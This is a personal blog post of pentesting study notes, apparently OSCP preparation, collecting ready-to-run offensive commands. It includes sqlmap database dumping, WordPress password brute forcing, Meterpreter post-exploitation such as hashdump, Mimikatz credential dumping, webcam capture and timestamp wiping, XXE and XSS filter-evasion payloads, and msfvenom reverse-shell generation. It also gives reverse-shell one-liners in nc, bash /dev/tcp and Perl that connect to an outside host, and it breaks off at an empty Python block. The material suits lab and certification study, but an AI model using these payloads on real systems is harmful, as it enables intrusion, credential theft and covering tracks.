#+BLOG: blog
#+POSTID: 1169
#+DATE: [2022-11-10 Thu 11:46]
#+author: Hp
#+BLOG: blog
#+PERMALINK: penetration-testing-information-database
#+CATEGORY: Hacking and Security
#+TAGS: hacking, pentesting, linux, emacs, org
#+TITLE: The complete, always updated, database for penetration testing information
#+DESCRIPTION: However I've been wanting to pursue an actual career in hacking and penetration testing, and learning for an OSCP exam seems like a good start. Org mode and emacs are wonderful stuffs. I have a org document that I used to document everything I find useful in learning pentesting, categorized. This is the blog version of it.
#+AUTHOR: Hp

** Preface
*** Intro
I've been learning hacking and penetration testing for a good while now, but I never took too seriously. However I've been wanting to pursue an actual career in this, and learning for an OSCP exam seems like a good start.

Org mode and emacs are wonderful stuffs. I have a org document that I used to document everything I find useful in learning pentesting, categorized. This is the blog version of it. Although I don't recommend you actually trying to read stuff in here, as the layouts are very unclear. This blog here is not optimized really for big org documents with several heading layers.

A better way to read this is through my github repo below, as github has good formatting for org documents.

[[/home/hp/Pictures/2022-11-10_11-46.png]]

This document really was designed to be used in emacs, as I can collapse all the headings and only open what's necessary. I can also find stuff I want very quickly with it.

You can find the original =org= file in [[https://github.com/hp27596/pentesting/blob/main/2022_10_01%20-%20The%20Big%20Hacking%20Database.org][This github repository of mine.]]

*** Tools prerequisites/installation
Most stuff in here are available in the Kali Linux repository. I strongly recommend setting up a Kali VM to run these tools, as some of them can mess up your daily driver Linux machine.

With that said, some stuffs can require to be run on bare metal. If you want to, say, use the =aircrack-ng= suite *using your integrated wireless card*, you have to install them on your main Linux distro. You should be able to find most packages on your distro's repo.

You should know the individual tools you use well anyways, and not just rely on having every single tool possible.

My recommended way to set up a VM is with Virt Manager on a Linux box. You can find out how to do that on [[https://peterconfidential.com/virt-manager-setup][This post]] (In construction.)

*** Some extra tools
[[https://github.com/vavkamil/awesome-bugbounty-tools]]

[[https://github.com/hhhrrrttt222111/Ethical-Hacking-Tools]]

#+TOC: headlines 2

** TODO Quick no brainer start (todo)
- Autorecon and nmapAutomator to scan a machine
- Brute ssh/ftp/weak forms with hydra
- WPScan/SQLMap/ZAP to check for web vulns
- Gobuster for website directory
- Check =/etc/passwd=, =/etc/shadow=, =sudo -l=
- LinPEAS for PrivEsc

** TODO Designing an autorecon script (todo)
- nmap port scanning >> append to result.txt
- thread: nmap scripts/vulns scanning >> append to result.txt
- curl headers for information
- if port 21/22/23 open:
    - check for vuln
    - thread hydra bruteforce >> if found, append to result.txt
- if port 80/443/8080 (or better: enumerated http service):
    - thread gobuster enum directory >> append to result.txt
    - thread uniscan >> result.txt
- if port 445 open:
    - check for smb vuln

** Information Gathering
*** Open source intelligent (OSInt)
**** Google dorking
Search for sites and filetypes with =site:xyz.com filetype:pdf=
Search titles with =intitle:index.of=
**** Find data from SSID with Wigle
**** Wappalyzer
**** Wayback machine
*** Image metadata and inspection
**** Google's reverse image search
[[https://images.google.com]]

It's useful to search for the image on Google Images sometimes. Can produce interesting results.

**** Hidden files/data in image file
***** Strings
Extract (possible) texts hidden in image with Linux's =strings=.

***** Steghide/stegseek
Get =steghide= hidden info:
#+begin_src bash
steghide info image.jpg
#+end_src

Extract with given password:
#+begin_src bash
steghide extract -sf stego.jpg -p 'u?WtKSraq'
#+end_src

(These arguments are so inconsistent!!)

Use =stegseek= to crack a =steghide= encrypted image.

Install with this command (not installed in kali by default)
#+begin_src bash
wget https://github.com/RickdeJager/stegseek/releases/download/v0.6/stegseek_0.6-1.deb
sudo apt install stegseek_0.6-1.deb
#+end_src

***** Binwalk (available in Kali)
Use to extract files compressed in/appended to an image file.

Run the binary on the image to see if there's any additional data
#+begin_src bash
binwalk -B image.jpg
#+end_src

Use =-e= to extract data.
#+begin_src bash
binwalk -e image.jpg
#+end_src

***** Pngcheck
Check if image has additional data after the end of file

**** Imagemagick
#+begin_src bash
yay -S imagemagick
identify -verbose image.jpg
#+end_src

**** Exiftool
#+begin_src bash
yay -S perl-image-exiftool
exiftool image.jpg
#+end_src

*** TODO Internet of things information with Shodan
*** Wireshark - inspect network data
**** Scanning
Headless scanning with =dumpcap=
#+begin_src bash
dumpcap -i 1 -b filesize:100000 -b files:20 -w mycapture.pcapng
#+end_src

**** Sniffing local wifi data with airmon/aircrack-ng
Start monitor mode, check wifi channels and let card monitor on target channel
#+begin_src bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo airmon-ng start wlan0mon 11
#+end_src

Set =dumpcap= to executable permission if not yet
#+begin_src bash
sudo chmod +x /usr/bin/dumpcap
#+end_src

Start scanning on =wlan0mon= with wireshark

Add either =wpa-psk= SSID and handshake, or =wpa-paw= SSID and password to tab =IEEE 802.11= in Preferences

**** Analyze pcap file
***** Http traffic
Filter by text/url
#+begin_src
http contains "https://www.wireshark.org"
http.request.uri == "https://www.wireshark.org/"
#+end_src

User agents
#+begin_src
wsp.header.user_agent matches "cldc"
#+end_src

Methods
#+begin_src
http.request.method == "POST"
#+end_src

***** Tcp traffic
Push traffic
#+begin_src
ip.addr == 192.168.170.145 && tcp.flags.push == 1
#+end_src

Other types of traffic
#+begin_src
(tcp.flags.syn == 1) || (tcp.flags.push == 1) || (tcp.flags.reset == 1)
#+end_src

Choose a package with data -> Follow TCP Streams

***** Other filtering techniques
[[https://www.wireshark.org/docs/man-pages/wireshark-filter.html][Read more]]
[[https://wiki.wireshark.org/DisplayFilters.md]]
[[https://tbhaxor-com.cdn.ampproject.org/v/s/tbhaxor.com/wifi-traffic-analysis-in-wireshark/amp/?amp_gsa=1&amp_js_v=a9&usqp=mq331AQKKAFQArABIIACAw%3D%3D#amp_tf=From%20%251%24s&aoh=16669278592749&csi=1&referrer=https%3A%2F%2Fwww.google.com&ampshare=https%3A%2F%2Ftbhaxor.com%2Fwifi-traffic-analysis-in-wireshark%2F]]

IP source and dest filter
#+begin_src
ip.src == 192.168.1.1
ip.dst eq www.mit.edu
#+end_src

Ports
#+begin_src
tcp.port == 80 || tcp.port == 443 || tcp.port == 8080
tcp.port in {80, 443, 8080}
#+end_src

** Enumeration/Scanning
*** Wifi hacking
**** Wifite script automation
**** Aircrack-ng suite
**** Wifi jamming
#+begin_src bash
mdk3 wlan0mon d -c 11
#+end_src

*** Network discovery
**** Nmap
***** Some notes about different types of scans.
- TCP Connect scans doesn't require root, may returns filtered results.
- SYN scans requires root, send raw packets instead, better results.
- UDP scans: very slow, use if target is known to have UDP services

***** Commonly used flags
=-sn=: Ping only
=-n=: No DNS resolution, this feels unnecessary
=-sV=: Version Detection
=-O=: OS Detection
=-T5=: Timing. T5 is fastest and seems to be no different than other timings.
=--min-parallelism=: More threads. 1000 when I want to be very fast

***** Get stuff
(Totally unnecessary, just needed for scripts writing purpose)

*Wlan name*
#+begin_src bash
wlan=$(ip a | grep -m 1 wl | awk '{ print $2 }' | awk -F ":" '{ print $1 }')
#+end_src

*IP range, short*
#+begin_src bash
iprange="$(ip a | grep wlp1s0 | grep inet | awk '{ print $2 }'| awk -F '.' 'BEGIN{OFS=FS}; NF{--NF};1').0/24"
#+end_src

*Ip range, extended*
#+begin_src bash
iprange="$(ip a | grep wlp1s0 | grep inet | awk '{ print $2 }'| awk -F '.' 'BEGIN{OFS=FS}; NF{NF-=2};1').0.0/16"
#+end_src

***** Quick nmap commands
****** Speed, no ports (Find all active IPs)
#+begin_src bash
sudo nmap "$iprange" -T5 --min-parallelism 1000 -sn -n
#+end_src

****** Popular port discovery with OS and version detection
#+begin_src bash
sudo nmap "$iprange" -p 21,22,23,80,443,445 -T5 -O --min-parallelism 100 -sV -n
#+end_src

****** Slow, find all ports and info, meant to work on only one or a few target
#+begin_src bash
sudo nmap "$iprange" -p- -T4 -O -sV -sC
#+end_src

****** SMB enumerate
#+begin_src bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.195.28
#+end_src

****** RPC enumerate
#+begin_src bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.195.28
#+end_src

****** Save to file flags
[[https://nmap.org/book/man-output.html][Read more]]

Quick Ref:
-oN <filespec> (normal output)
-oX <filespec> (XML output)
-oS <filespec> (ScRipT KIdd|3 oUTpuT)
-oG <filespec> (grepable output)
-oA <basename> (Output to all formats)
-v (Increase verbosity level) , -v<level> (Set verbosity level)
-d (Increase debugging level) , -d<level> (Set debugging level)
--reason (Host and port state reasons)

**** TODO Other scripts/tools
*** Single target enumeration
**** Gobuster: Find common vulnerable URLs
Gobuster is a tool used to discover URIs including directories and files as well as DNS subdomains.
#+begin_src bash
gobuster dir -u http://192.168.0.155/ -w /usr/share/wordlists/dirb/common.txt -x "php,txt,html"
#+end_src

=-x=: look for extensions in combination with the wordlist

/Tips: consider checking for other extensions if default search returns no results/

Some other wordlists on Kali
#+begin_src bash
/usr/share/wordlists/dirb/big.txt
/usr/share/seclists/Discovery/Web-content/big.txt
/usr/share/seclists/Discovery/Web-content/directory-list-2.3-big.txt
#+end_src

**** nmapAutomator
[[https://github.com/hp27596/pentesting][My own fork]]: This is nice for automated recon on a single target. I just found one bug so I fork a workaround.

**** TODO Autorecon
**** Sqlmap: Discover SQL injection vulnerabilities
Let sqlmap check for possible attack vectors
#+begin_src bash
sqlmap -u link.to/target
#+end_src

Options:
=--dbs= Check for databases
=--forms= Check for possible form injections
=--tables= and =--columns= Check for tables/columns from databases gathered
=--batch= Never ask for user's input
~--data="username=das&password=dasd"~ POST form to exploit (if exploiting forms)
=--dump all= Dump all data
=-D= choose which databases to dump
=--proxy= run through proxy
=--crawl= crawl multiple pages
=--threads= run with multiple threads (shouldn't be too high)
=-v= verbose
=--current-user= enum current user, =--is-dba= to check for admin permissions
=--identify-waf= identify if using web app firewall, possible escapes located within directory =/usr/share/sqlmap/tamper/=
=--sql-shell= get sql shell
=--os-shell= get os shell or =--os-cmd <cmd>= for sql on windows
=--tor= use tor network

*Full commands to exploit a vulnerable form*
Get databases.
#+begin_src bash
sqlmap -u 10.10.62.185/administrator.php --data="username=das&password=dasd" --dbs --batch
#+end_src

Get data from a database.
#+begin_src bash
sqlmap -u 10.10.62.185/administrator.php --data="username=das&password=dasd" --batch --dump all -D users
#+end_src

**** Uniscan: Webapp general vulnerability scanner
#+begin_quote
OPTIONS:
	-h 	help
	-u 	<url> example: https://www.example.com/
	-f 	<file> list of url's
	-b 	Uniscan go to background
	-q 	Enable Directory checks
	-w 	Enable File checks
	-e 	Enable robots.txt and sitemap.xml check
	-d 	Enable Dynamic checks
	-s 	Enable Static checks
	-r 	Enable Stress checks
	-i 	<dork> Bing search
	-o 	<dork> Google search
	-g 	Web fingerprint
	-j 	Server fingerprint
#+end_quote

Usage:
#+begin_src bash
uniscan -u http://www.example.com/ -qweds
uniscan -f sites.txt -bqweds
uniscan -i uniscan
uniscan -i "ip:xxx.xxx.xxx.xxx"
uniscan -o "inurl:test"
uniscan -u https://www.example.com/ -r
#+end_src

Everything:
#+begin_src bash
uniscan -qwedsrgj -u http://site.com
#+end_src

**** WPScan: Wordpress scanner
Find WP site info:
#+begin_src bash
wpscan --url http://ip.com
#+end_src

Bruteforce WP password:
#+begin_src bash
wpscan -v -U userlist.txt -P passlist.txt --url http://ip.com
#+end_src

** Exploitation
*** Kali Linux tools
**** Sqlite database query
Query the db
#+begin_src bash
sqlite3 database.db
#+end_src

Dump tables
#+begin_src
.tables
#+end_src

Dump data
#+begin_src
PRAGMA table_info(customers);
SELECT * FROM customers;
#+end_src

*** Metasploit Framework
**** TODO Notable exploits
***** SSH exploit
***** Eternalblue/doublepulsar Windows 7 exploit
***** MS08-067 RPC Windows XP exploit
***** Icecast buffer overflow
**** Usage and tips
***** Sessions interaction in metasploit
=bg= to background current session
Run =sessions= with these arguments
- =-i 1= Interact with session #1
- =-h= Help
- =-u= Upgrade shell to meterpreter
- =-l= List all sessions

***** Meterpreter cheatsheet
****** Basic commands
#+begin_src
cat
ps
ls
edit
bg
kill
shell
#+end_src

****** System info and interact
#+begin_src
sysinfo
migrate -P <pid> or -N <name>
clearev
idletime
getuid
getprivs
#+end_src

****** Post exploit
#+begin_src
getsystem
hashdump
webcam_snap
webcam_stream
record_mic
screenshot
screenshare
download
upload
#+end_src

***** Post exploitation scripts
****** Exploit suggester
#+begin_src
run post/multi/recon/local_exploit_suggester
#+end_src

****** Mimikatz
#+begin_src
load kiwi
help
creds_all
#+end_src

****** Timestomp
#+begin_src
timestomp file.exe -v #view file's timestamp
timestomp file.exe -r #blanking a file
timestomp C:\\ -r #blanking whole directory's timestamp
#+end_src

****** Enum web bowsers
#+begin_src
run post/windows/gather/enum_chrome
run post/multi/gather/firefox_creds
#+end_src

*** Web hacking
**** Content discovery
***** Robots.txt and sitemap.xml
Can sometimes have hidden directories

***** Favicon
Is the icon displayed in browser's address bar used for website branding

#+begin_src bash
curl url/favicon.ico | md5sum
#+end_src

Compared against favicon database.
[[https://wiki.owasp.org/index.php/OWASP_favicon_database]]

***** HTML header
Can be used to discover the programmning/scripting language and software.

Check with
#+begin_src bash
curl ip -v
#+end_src

**** Burpsuite - Websites/Web vulnerability scanning/app pentesting
***** Burp proxy - Capture/modify requests and responses
*Proxy tab:* Useful information and readings. When =intercept is on= is enabled, hang all requests so we can forward/drop/modify the data.

*Options:*
- Add rules to interception.
- =Match and replace=: Change user agents, drop cookies, etc

*Setup:* Get =FoxyProxy= addon in browser. (Use local ip: =127.0.0.1:8080= or otherwise printed in Burp Suite)

***** Proxying https
With proxy activated, head to [[http://burp/cert]]. Will download a file called =cacert.der=

/View certificates/ on your web browser, and import the certificate downloaded.

***** Tips
- Any requests captured can be sent to other tools in the framework by right-clicking them and choosing "Send to...". For example, we could take a previous HTTP request that has already been proxied to the target and send it to Repeater.

Under *Target*,
- Scoping:
  Is used to clean up incoming traffic for better viewing.
  Add IPs/domains to this tab to reduce scope.

- Issue Definitions: Looks for vulnerabilities on the page with descriptions and references to plan out attacks.

**** Methodology
***** Weak/non configured websites
Can sometimes leave files and directories behind that can still be access.

Use =google=, =exploit-db= and such to search for possible vectors (github repo, default login pages like =wp-admin=,...)

***** Broken login portal
#+begin_quote
A lot of times what happens is that developers forgets to sanitize the input(username & password) given by the user in the code of their application, which can make them vulnerable to attacks like SQL injection. However, we are going to focus on a vulnerability that happens because of a developer's mistake but is very easy to exploit i.e re-registration of an existing user.

Let's understand this with the help of an example, say there is an existing user with the name admin and now we want to get access to their account so what we can do is try to re-register that username but with slight modification. We are going to enter " admin"(notice the space in the starting). Now when you enter that in the username field and enter other required information like email id or password and submit that data. It will actually register a new user but that user will have the same right as normal admin. That new user will also be able to see all the content presented under the user admin.
#+end_quote

***** TODO Broken access control

***** TODO Security misconfiguration

***** TODO Insecure deserialization (cookies)
View in inspect > storage tab.

***** TODO Known vulnerabilities/Outdated software

***** TODO Remote file inclusion

**** XML exploitation
***** XML basics
****** What is XML?
#+begin_quote
XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.
#+end_quote

****** Why we use XML?
1. XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens.

2. The data stored and transported using XML can be changed at any point in time without affecting the data presentation.

3. XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.

4. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.

****** Uses and syntaxes
******* XML Prolog
Is the first line of a XML document. Specifies the XML version and the encoding used in the XML document. Not compulsory, but is considered a "good practice" to put that line in all XML documents.
#+begin_src xml
<?xml version="1.0" encoding="UTF-8"?> <!-- prolog -->
<mail> <!-- root element, must have one in xml file -->
   <to>falcon</to> <!-- children elements -->
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
   <text category = "message">You need to learn about XXE</text>
   <!-- can set attribute like html -->
</mail>
#+end_src

******* Document type definition (DTD)
#+begin_quote
DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document.
#+end_quote

Is usually the 2nd line on an XML document. Can be called from a file or just a line in the doc.

*Example: =note.dtd=.*
#+begin_src xml
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
#+end_src

And an XML file that uses =dtd= file
#+begin_src xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>
#+end_src

Here's what all those terms used in note.dtd mean
=!DOCTYPE= note -  Defines a root element of the document named note
=!ELEMENT= note - Defines that the note element must contain the elements: "to, from, heading, body"
=!ELEMENT= =to= - Defines the =to= element to be of type "#PCDATA"
=#PCDATA= means parseable character data.

******* XML entity
XML entities are a way of representing an item of data within an XML document, instead of using the data itself.

Various entities are built in to the specification of the XML language. For example, the entities =&lt;= and =&gt;= represent the characters =<= and =>=.

These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.

XML allows custom entities to be defined within the DTD. For example:
#+begin_src xml
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
#+end_src

This definition means that any usage of the entity reference =&myentity;= within the XML document will be replaced with the defined value: ="my entity value"=.

***** XML External Entity attack/injection
****** Definition
#+begin_quote
An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.

There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).
1) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.

2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.
#+end_quote

XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.

The declaration of an external entity uses the =SYSTEM= keyword and must specify a URL from which the value of the entity should be loaded. For example:

#+begin_src xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
#+end_src

The URL can use the =file://= protocol, and so external entities can be loaded from file. For example:
#+begin_src xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
#+end_src

[[https://portswigger.net/web-security/xxe][Read more]]

****** XXE Payload example
#+begin_src xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
#+end_src

#+begin_src xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
#+end_src

**** TODO Cross Site Scripting/XSS (Better term to understand: Javascript injection)
***** Types
****** Reflected XSS
Malicious script comes from the current HTTP request.

Arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.

Example:
#+begin_src html
https://insecure-website.com/status?message=All+is+well.
<p>Status: All is well.</p>
#+end_src
->
#+begin_src html
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
<p>Status: <script>/* Bad stuff here... */</script></p>
#+end_src

****** Stored XSS (persistent/second order XSS)
Malicious script comes from the website's database.

Arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

Example: A message board application lets users submit messages, which are displayed to other users.
#+begin_src html
<p>Hello, this is my message!</p>
#+end_src
->
#+begin_src html
<p><script>/* Bad stuff here... */</script></p>
#+end_src html

****** DOM-Based XSS
Vulnerability exists in client-side code rather than server-side code.

Arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.

Example: An application uses some JavaScript to read the value from an input field and write that value to an element within the HTML.
#+begin_src js
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
#+end_src
->
#+begin_src html
You searched for: <img src=1 onerror='/* Bad stuff here... */'>
#+end_src

***** Blackbox testing methodology
****** Detect input vectors
Check all user-defined variables (HTTP parameters, POST data, hidden form fields, predefined selection value, etc)

****** Analyze input vectors
Either use an automated fuzzing tool, an automated list of known attack strings, or manually:

#+begin_src html
<script>alert(123)</script>
"><script>alert(document.cookie)</script>
#+end_src

[[https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html][Cheatsheet]]

****** Check impact
Identifies any special characters that were not properly encoded, replaced, or filtered out. The set of vulnerable unfiltered special characters will depend on the context of that section of HTML.

The key HTML entities to identify are:
#+begin_quote
> (greater than)
< (less than)
& (ampersand)
' (apostrophe or single quote)
" (double quote)
#+end_quote

[[https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references][Full list on wikipedia]]

HTML action/javascript code:
#+begin_quote
\n (new line)
\r (carriage return)
' (apostrophe or single quote)
" (double quote)
\ (backslash)
\uXXXX (unicode values)
#+end_quote

***** Other XSS attacks vectors
****** Check these links for more readings
[[https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting]]

[[https://portswigger.net/web-security/cross-site-scripting]]

****** Tag attribute value (Web app uses input as html input)
There are cases in which an XSS exploit can be carried out without the use of =<script>= tags and even without the use of characters such as < and > that are commonly filtered.

For example, the web application could use the user input value to fill an attribute, as shown in the following code:

#+begin_src html
<input type="text" name="state" value="INPUT_FROM_USER">
#+end_src

Then an attacker could submit the following code:
#+begin_src html
" onfocus="alert(document.cookie)
#+end_src

****** Different syntaxes/encoding
Sometimes obfuscating the attack can bypass filters
#+begin_src html
"><script >alert(document.cookie)</script >
"><ScRiPt>alert(document.cookie)</ScRiPt>
"%3cscript%3ealert(document.cookie)%3c/script%3e
#+end_src

****** Bypass non recursive filtering
If filtering is not recurisve:
#+begin_src html
<scr<script>ipt>alert(document.cookie)</script>
#+end_src

****** Including external script
#+begin_src html
http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
#+end_src

****** HTTP Parameter Pollution (HPP)
This evasion technique consists of splitting an attack vector between multiple parameters that have the same name. The manipulation of the value of each parameter depends on how each web technology is parsing these parameters, so this type of evasion is not always possible. If the tested environment concatenates the values of all parameters with the same name, then an attacker could use this technique in order to bypass pattern- based security mechanisms. Regular attack:

#+begin_src html
http://example/page.php?param=<script>[...]</script>
#+end_src

Attack using HPP:
#+begin_src html
http://example/page.php?param=<script&param=>[...]</&param=script>
#+end_src

***** Tools
****** xsser
#+begin_src bash
xsser --wizard #use the wizard
#+end_src

****** TODO OWASP ZAP
[[https://github.com/Grunny/zap-cli][Zap cli]]

****** IDEA Burpsuite web vulnerability scanner (Automated is pro only, use ZAP)

**** Check js and storage tab for possible cookie manipulation

**** TODO SQL injection
Classic injection on vulnerable login form:
#+begin_src sql
' or 1=1--
bender@juice-sh.op'--
#+end_src
(comment out the password in the sql form)

**** TODO Poison null byte
A Poison Null Byte looks like this: =%00=.
#+begin_src
10.10.10.10/ftp/package.json%2500.md
#+end_src

#+begin_quote
Note: as we can download it using the url, we will need to encode this into a url encoded format.

The Poison Null Byte will now look like this: =%2500=. Adding this and then a .md to the end will bypass the 403 error!

A Poison Null Byte is actually a NULL terminator. By placing a NULL character in the string at a certain byte, the string will tell the server to terminate at that point, nulling the rest of the string.
#+end_quote

**** TODO Try more challenges in this box https://tryhackme.com/room/owaspjuiceshop

**** HOLD Openvas - Open source burp alternative
***** Install
#+begin_src bash
sudo apt install openvas
gvm-setup #changed from openvas-setup
#+end_src

***** Usage
Cli commands
[[https://docs.greenbone.net/GSM-Manual/gos-21.04/en/gmp.html]]


***** TODO Refresh certificates
Check expiration
#+begin_src bash
cat /var/log/openvas/openvasmd.log
#+end_src

??
Will cross this bridge when we get there

*** Binaries and payloads
**** Msfvenom - Create payloads
***** Staged vs stageless payloads: The difference
*Staged payloads:*
- Usual name convention: =windows/meterpreter/reverse_tcp=
- Classic Metasploit payloads.
- Establish a connection first, then send the actual payloads (i.e. =metsrv=) later.
- Smaller size, makes a bunch of assumptions. Good for exploitations with limited available code.

*Stageless payloads:*
- Usual name convention: =windows/meterpreter_reverse_tcp=
- Less known option.
- Includes everything needed to get a shell.
- Substantially larger than a stageless payload.

***** Windows payloads
Staged Payloads
#+begin_src bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
#+end_src

Stageless Payloads
#+begin_src bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
#+end_src

***** Linux payloads
Staged Payloads for Linux
#+begin_src bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
#+end_src

Stageless Payloads for Linux
#+begin_src bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
#+end_src

***** Web payloads
#+begin_src bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
#+end_src

#+begin_src bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > example.war
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
#+end_src

**** Python server payload
If target has permission to connect to a webserver with root, can host a file from attack machine with python.

Create a simple webserver payload with python
#+begin_src bash
python -m http.server 80 --directory .
#+end_src

Use a netcat payload, or a custom bash script.

*** Public service commands/tips/exploitation
**** SSH
***** Connect via ssh with no password
If you can write to =~/.ssh= folder, you can create your own ssh keypair, put the public hash file to =authorized_keys= file, and then log in with your key password.

Generate a rsa keypair
#+begin_src bash
ssh-keygen -t rsa
#+end_src

Copy the contents of =.hash= file to attacker machine.

Login with your private key
#+begin_src bash
ssh -i passfile host@ip
#+end_src

***** SSH - outdated algorithms
#+begin_src bash
ssh -p 22 james@10.10.19.57 -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa
#+end_src

**** FTP
***** Basic commands
#+begin_src bash
get/fget
ls
pwd
put
mkdir
status
#+end_src

***** ProFtpd 1.3.5 =mod_copy= exploit
[[http://www.proftpd.org/docs/contrib/mod_copy.html]]

#+begin_quote
The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
#+end_quote

Commands
#+begin_src bash
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa #a public accessible location
#+end_src

**** Mysql
Login remotely with credentials
#+begin_src
mysql -u root -p'root' \
        -h 127.0.0.1 -P 3306 \
        -D local
#+end_src

*** Linux/server hacking
**** Reverse shell with netcat
****** Listener
#+begin_src bash
nc -lvnp 4444
#+end_src

****** Exploit
******* Remote exploit (usually from web vulnerability/injection)
#+begin_src bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.0.46 4444 >/tmp/f
#+end_src
******* With nc
#+begin_src bash
nc 10.4.0.46 4444 –e /bin/bash
#+end_src

******* Just bash
#+begin_src bash
bash -i >& /dev/tcp/10.4.0.46/4444 0>&1
#+end_src

******* Perl
#+begin_src perl
perl -e 'use Socket;$i="10.4.0.46";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
#+end_src

******* Python
#+begin_src python
